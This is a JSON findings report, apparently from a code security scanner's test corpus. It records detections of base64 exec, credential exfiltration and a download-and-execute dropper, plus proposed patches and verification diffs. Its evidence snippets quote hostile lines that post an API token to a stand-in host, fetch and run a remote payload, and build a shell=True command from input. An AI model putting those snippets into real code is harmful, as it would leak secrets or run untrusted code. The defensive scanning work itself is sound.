@@ -1,0 +1,262 @@
+{
+  "repo_path": "tests/corpus",
+  "findings": [
+    {
+      "id": "F-001",
+      "category": "malware",
+      "rule_id": "PY-DECODE-EXEC",
+      "title": "Base64 decode passed to exec",
+      "severity": "high",
+      "confidence": 0.96,
+      "file": "tests/corpus/malicious/base64_exec.py",
+      "line": 11,
+      "snippet": "exec(base64.b64decode(payload).decode())",
+      "message": "Decoded base64 content is executed dynamically.",
+      "target_region": {
+        "file": "tests/corpus/malicious/base64_exec.py",
+        "start_line": 11,
+        "end_line": 11
+      },
+      "behavior_path": [
+        "run_payload()",
+        "TRANSFORM: base64.b64decode(payload).decode()",
+        "SINK: exec(...)"
+      ],
+      "codegraph_context": {
+        "callers": [],
+        "callees": ["base64.b64decode", "exec"],
+        "imports": ["base64"],
+        "references": ["run_payload"]
+      },
+      "evidence": [
+        {
+          "file": "tests/corpus/malicious/base64_exec.py",
+          "line": 11,
+          "snippet": "exec(base64.b64decode(payload).decode())",
+          "message": "Decoded payload reaches dynamic execution sink."
+        }
+      ]
+    },
+    {
+      "id": "F-002",
+      "category": "security",
+      "rule_id": "PY-ENV-EXFIL",
+      "title": "Environment variable exfiltrated via HTTP POST",
+      "severity": "high",
+      "confidence": 0.88,
+      "file": "tests/corpus/malicious/env_exfil.py",
+      "line": 12,
+      "snippet": "requests.post(\"https://example.invalid/collect\", json={\"token\": token}, timeout=2)",
+      "message": "Sensitive environment variable is sent to a remote endpoint.",
+      "target_region": {
+        "file": "tests/corpus/malicious/env_exfil.py",
+        "start_line": 11,
+        "end_line": 12
+      },
+      "behavior_path": [
+        "SOURCE: os.environ.get(\"API_TOKEN\")",
+        "SINK: requests.post(..., json={\"token\": token})"
+      ],
+      "codegraph_context": {
+        "callers": [],
+        "callees": ["os.environ.get", "requests.post"],
+        "imports": ["os", "requests"],
+        "references": ["send_token"]
+      },
+      "evidence": [
+        {
+          "file": "tests/corpus/malicious/env_exfil.py",
+          "line": 11,
+          "snippet": "token = os.environ.get(\"API_TOKEN\")",
+          "message": "Environment token source."
+        },
+        {
+          "file": "tests/corpus/malicious/env_exfil.py",
+          "line": 12,
+          "snippet": "requests.post(\"https://example.invalid/collect\", json={\"token\": token}, timeout=2)",
+          "message": "Network sink receives the token."
+        }
+      ]
+    },
+    {
+      "id": "F-003",
+      "category": "malware",
+      "rule_id": "PY-DROPPER",
+      "title": "Downloaded payload written then executed",
+      "severity": "high",
+      "confidence": 0.91,
+      "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+      "line": 11,
+      "snippet": "subprocess.run([\"python\", target], check=False)",
+      "message": "Network content is persisted as Python code and then executed.",
+      "target_region": {
+        "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+        "start_line": 5,
+        "end_line": 11
+      },
+      "behavior_path": [
+        "download: requests.get(...).text",
+        "write: open(target, \"w\").write(fetch_payload())",
+        "execute: subprocess.run([\"python\", target])"
+      ],
+      "codegraph_context": {
+        "callers": [],
+        "callees": ["requests.get", "open.write", "subprocess.run"],
+        "imports": ["requests", "subprocess"],
+        "references": ["fetch_payload", "install_stage"]
+      },
+      "evidence": [
+        {
+          "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+          "line": 6,
+          "snippet": "return requests.get(\"https://example.invalid/payload.py\", timeout=2).text",
+          "message": "Remote Python payload is downloaded."
+        },
+        {
+          "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+          "line": 10,
+          "snippet": "open(target, \"w\", encoding=\"utf-8\").write(fetch_payload())",
+          "message": "Downloaded payload is written to disk."
+        },
+        {
+          "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+          "line": 11,
+          "snippet": "subprocess.run([\"python\", target], check=False)",
+          "message": "Written payload is executed."
+        }
+      ]
+    },
+    {
+      "id": "F-004",
+      "category": "security",
+      "rule_id": "PY-SHELL-INJECTION",
+      "title": "subprocess shell=True with user-controlled command",
+      "severity": "high",
+      "confidence": 0.84,
+      "file": "tests/corpus/vulnerable/shell_injection.py",
+      "line": 5,
+      "snippet": "subprocess.run(f\"cat {filename}\", shell=True, check=False)",
+      "message": "A command built from external input is executed through the shell.",
+      "target_region": {
+        "file": "tests/corpus/vulnerable/shell_injection.py",
+        "start_line": 5,
+        "end_line": 5
+      },
+      "behavior_path": [
+        "SOURCE: filename argument",
+        "SINK: subprocess.run(..., shell=True)"
+      ],
+      "codegraph_context": {
+        "callers": [],
+        "callees": ["subprocess.run"],
+        "imports": ["subprocess"],
+        "references": ["list_user_file"]
+      },
+      "evidence": [
+        {
+          "file": "tests/corpus/vulnerable/shell_injection.py",
+          "line": 5,
+          "snippet": "subprocess.run(f\"cat {filename}\", shell=True, check=False)",
+          "message": "Shell execution sink."
+        }
+      ]
+    },
+    {
+      "id": "F-005",
+      "category": "dead_code",
+      "rule_id": "PY-UNUSED-FUNCTION",
+      "title": "Function has no callers or references",
+      "severity": "low",
+      "confidence": 0.68,
+      "file": "tests/corpus/dead_code/unused_function.py",
+      "line": 5,
+      "snippet": "def old_helper():",
+      "message": "CodeGraph found no callers or references for old_helper().",
+      "target_region": {
+        "file": "tests/corpus/dead_code/unused_function.py",
+        "start_line": 5,
+        "end_line": 6
+      },
+      "behavior_path": [],
+      "codegraph_context": {
+        "callers": [],
+        "references": [],
+        "importers": [],
+        "exported": false,
+        "referenced_by_tests": false
+      },
+      "evidence": [
+        {
+          "file": "tests/corpus/dead_code/unused_function.py",
+          "line": 5,
+          "snippet": "def old_helper():",
+          "message": "No callers found."
+        }
+      ]
+    }
+  ],
+  "patches": [
+    {
+      "finding_id": "F-001",
+      "action": "quarantine",
+      "file": "tests/corpus/malicious/base64_exec.py",
+      "start_line": 11,
+      "end_line": 11,
+      "replacement": "raise RuntimeError(\"Blocked suspicious decoded dynamic execution\")",
+      "rationale": "The decoded payload reaches exec(). Quarantine the sink instead of deleting the whole function.",
+      "expected_risk_reduction": "Removes dynamic execution of decoded content."
+    },
+    {
+      "finding_id": "F-002",
+      "action": "remove",
+      "file": "tests/corpus/malicious/env_exfil.py",
+      "start_line": 11,
+      "end_line": 12,
+      "replacement": "return None",
+      "rationale": "The only behavior in target_region collects a token and posts it remotely.",
+      "expected_risk_reduction": "Removes credential exfiltration path."
+    },
+    {
+      "finding_id": "F-005",
+      "action": "refactor",
+      "file": "tests/corpus/dead_code/unused_function.py",
+      "start_line": 5,
+      "end_line": 6,
+      "replacement": "",
+      "rationale": "CodeGraph context shows zero callers, references, importers, or test references.",
+      "expected_risk_reduction": "Reduces dead code surface without changing reachable behavior."
+    }
+  ],
+  "verification": [
+    {
+      "finding_id": "F-001",
+      "status": "patched",
+      "before_severity": "high",
+      "after_severity": null,
+      "scanner_passed": true,
+      "tests_passed": true,
+      "diff": "--- a/tests/corpus/malicious/base64_exec.py\n+++ b/tests/corpus/malicious/base64_exec.py\n@@ -3,4 +3,4 @@\n def run_payload():\n     payload = \"cHJpbnQoJ3N0YWdlMicp\"\n-    exec(base64.b64decode(payload).decode())\n+    raise RuntimeError(\"Blocked suspicious decoded dynamic execution\")",
+      "notes": "Scanner no longer reports PY-DECODE-EXEC for this target region."
+    },
+    {
+      "finding_id": "F-002",
+      "status": "patched",
+      "before_severity": "high",
+      "after_severity": null,
+      "scanner_passed": true,
+      "tests_passed": null,
+      "diff": "--- a/tests/corpus/malicious/env_exfil.py\n+++ b/tests/corpus/malicious/env_exfil.py\n@@ -3,5 +3,4 @@\n \n def send_token():\n-    token = os.environ.get(\"API_TOKEN\")\n-    requests.post(\"https://example.invalid/collect\", json={\"token\": token}, timeout=2)\n+    return None",
+      "notes": "Network sink removed from the target region."
+    },
+    {
+      "finding_id": "F-005",
+      "status": "needs_review",
+      "before_severity": "low",
+      "after_severity": "low",
+      "scanner_passed": true,
+      "tests_passed": null,
+      "diff": "",
+      "notes": "Removal is proposed but not auto-applied because dead-code confidence is below 0.75."
+    }
+  ]
+}
